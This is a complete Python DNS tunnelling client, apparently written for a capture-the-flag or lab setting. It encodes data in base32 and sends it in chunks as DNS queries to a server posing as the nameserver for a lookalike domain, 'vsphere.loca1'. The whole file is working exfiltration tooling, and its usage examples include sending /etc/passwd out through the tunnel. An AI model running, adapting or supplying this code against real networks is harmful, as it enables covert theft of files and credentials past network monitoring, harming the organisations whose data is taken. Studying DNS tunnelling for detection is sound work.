#!/usr/bin/env python3
"""
dns_tunnel_client.py — DNS Tunnel Client (Sender)
Run on: 172.16.172.2
Encodes data as base32, splits into DNS-safe labels, sends as A queries
to the tunnel server at 172.16.173.25 acting as NS for vsphere.loca1

Usage:
    # Send a string
    python3 dns_tunnel_client.py --server 172.16.173.25 --text "hello from lab"

    # Send a file
    python3 dns_tunnel_client.py --server 172.16.173.25 --file /etc/passwd

    # Use alternate port (for testing without root)
    python3 dns_tunnel_client.py --server 172.16.173.25 --port 5353 --text "test"

Lab: vsphere.loca1 | CTF/research use only
"""

import socket
import struct
import base64
import argparse
import os
import sys
import time
import random
import string

DOMAIN     = "vsphere.loca1"
CHUNK_SIZE = 30          # raw bytes per chunk → 48 base32 chars
MAX_LABEL  = 63          # DNS label max length
B32_PER_LABEL = 48       # base32 chars that fit in one label (30 bytes → 48)
MAX_B32_LABELS = 3       # max data labels per query (48×3=144 chars of base32 = 108 bytes)
RETRY_MAX  = 3
RETRY_WAIT = 0.5         # seconds between retries
INTER_CHUNK_DELAY = 0.05 # seconds between chunks (be gentle to the resolver)


# ─── DNS Wire Format ──────────────────────────────────────────────────────────

def build_dns_query(txid, qname):
    """Build a minimal DNS A query for qname."""
    header = struct.pack("!HHHHHH",
        txid,
        0x0100,   # standard query, recursion desired
        1, 0, 0, 0
    )
    qsec = b""
    for label in qname.split("."):
        enc = label.encode("ascii")
        if len(enc) > MAX_LABEL:
            raise ValueError(f"Label too long ({len(enc)}): {label[:20]}...")
        qsec += bytes([len(enc)]) + enc
    qsec += b"\x00"
    qsec += struct.pack("!HH", 1, 1)   # QTYPE=A QCLASS=IN
    return header + qsec


def parse_dns_response_ack(data):
    """Extract the answer IP from a DNS response (used as ACK)."""
    if len(data) < 12:
        return None
    ancount = struct.unpack("!H", data[6:8])[0]
    if ancount == 0:
        return None
    # Skip header + question section to reach answer
    offset = 12
    while offset < len(data):
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length & 0xC0 == 0xC0:
            offset += 2
            break
        offset += 1 + length
    offset += 4   # skip QTYPE + QCLASS
    # Now at first answer RR
    offset += 2   # NAME (pointer assumed)
    if offset + 10 > len(data):
        return None
    rtype = struct.unpack("!H", data[offset: offset+2])[0]
    offset += 8   # TYPE CLASS TTL
    rdlen = struct.unpack("!H", data[offset: offset+2])[0]
    offset += 2
    if rtype == 1 and rdlen == 4 and offset + 4 <= len(data):
        return ".".join(str(b) for b in data[offset: offset+4])
    return None


# ─── Session Helpers ──────────────────────────────────────────────────────────

def random_session_id(length=6):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def b32encode_clean(data: bytes) -> str:
    """Base32 encode without padding, lowercase."""
    return base64.b32encode(data).decode("ascii").rstrip("=").lower()


def chunk_data(data: bytes, size: int):
    """Split data into chunks of `size` bytes."""
    return [data[i: i + size] for i in range(0, len(data), size)]


# ─── DNS I/O ──────────────────────────────────────────────────────────────────

def send_query(sock, server_ip, port, qname, timeout=2.0) -> str | None:
    """Send DNS query and return ACK IP or None on failure."""
    txid = random.randint(1, 0xFFFF)
    pkt  = build_dns_query(txid, qname)

    for attempt in range(RETRY_MAX):
        try:
            sock.sendto(pkt, (server_ip, port))
            sock.settimeout(timeout)
            resp, _ = sock.recvfrom(512)
            return parse_dns_response_ack(resp)
        except socket.timeout:
            if attempt < RETRY_MAX - 1:
                print(f"    [!] timeout, retrying ({attempt+2}/{RETRY_MAX})...")
                time.sleep(RETRY_WAIT)
        except Exception as e:
            print(f"    [!] send error: {e}")
            break
    return None


# ─── Main Transfer Logic ──────────────────────────────────────────────────────

def send_data(server_ip: str, port: int, data: bytes, label: str = "data"):
    """Encode and transmit data to the tunnel server."""
    sess = random_session_id()
    chunks = chunk_data(data, CHUNK_SIZE)
    total  = len(chunks)

    print(f"[*] Session ID : {sess}")
    print(f"[*] Payload    : {len(data)} bytes → {total} chunks")
    print(f"[*] Server     : {server_ip}:{port}")
    print(f"[*] Domain     : {DOMAIN}")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # ── Ping / connectivity check ────────────────────────────────────────────
    ping_qname = f"ping.{DOMAIN}"
    print(f"[*] Pinging server...")
    ack = send_query(sock, server_ip, port, ping_qname, timeout=2.0)
    if ack is None:
        print(f"[!] No response from {server_ip}:{port}. Check server is running.")
        sock.close()
        sys.exit(1)
    print(f"[+] Server alive (ACK: {ack})\n")

    # ── Transmit chunks ──────────────────────────────────────────────────────
    success = 0
    for seq, chunk in enumerate(chunks):
        b32 = b32encode_clean(chunk)

        # Split b32 payload across multiple labels if needed
        b32_labels = [b32[i: i + B32_PER_LABEL] for i in range(0, len(b32), B32_PER_LABEL)]
        data_part  = ".".join(b32_labels)

        # Header label: t-<sessid>-<seq4hex>-<total4hex>
        hdr = f"t-{sess}-{seq:04x}-{total:04x}"

        qname = f"{hdr}.{data_part}.{DOMAIN}"

        # Validate total query length (DNS max 253 chars)
        if len(qname) > 253:
            print(f"[!] qname too long ({len(qname)} chars) at seq={seq}. Reduce CHUNK_SIZE.")
            sock.close()
            sys.exit(1)

        ack = send_query(sock, server_ip, port, qname)
        status = f"ACK {ack}" if ack else "NO ACK"
        print(f"  [{seq+1:>4}/{total}] {len(chunk):>3}B  {status}")

        if ack:
            success += 1
        else:
            print(f"  [!] Chunk {seq} failed after {RETRY_MAX} retries")

        time.sleep(INTER_CHUNK_DELAY)

    sock.close()
    print(f"\n[★] Transfer complete: {success}/{total} chunks ACK'd")
    if success < total:
        print(f"[!] {total - success} chunks were not acknowledged — consider resending")


# ─── Entry Point ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="DNS Tunnel Client — sends data via DNS queries to vsphere.loca1"
    )
    parser.add_argument("--server", required=True,        help="Server IP (172.16.173.25)")
    parser.add_argument("--port",   type=int, default=53, help="Server UDP port (default: 53)")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--text",  help="Send a string payload")
    group.add_argument("--file",  help="Send a file")

    args = parser.parse_args()

    if args.text:
        data  = args.text.encode("utf-8")
        label = "text"
    else:
        if not os.path.isfile(args.file):
            print(f"[!] File not found: {args.file}")
            sys.exit(1)
        with open(args.file, "rb") as f:
            data = f.read()
        label = os.path.basename(args.file)
        print(f"[*] File: {args.file} ({len(data)} bytes)")

    send_data(args.server, args.port, data, label)


if __name__ == "__main__":
    main()
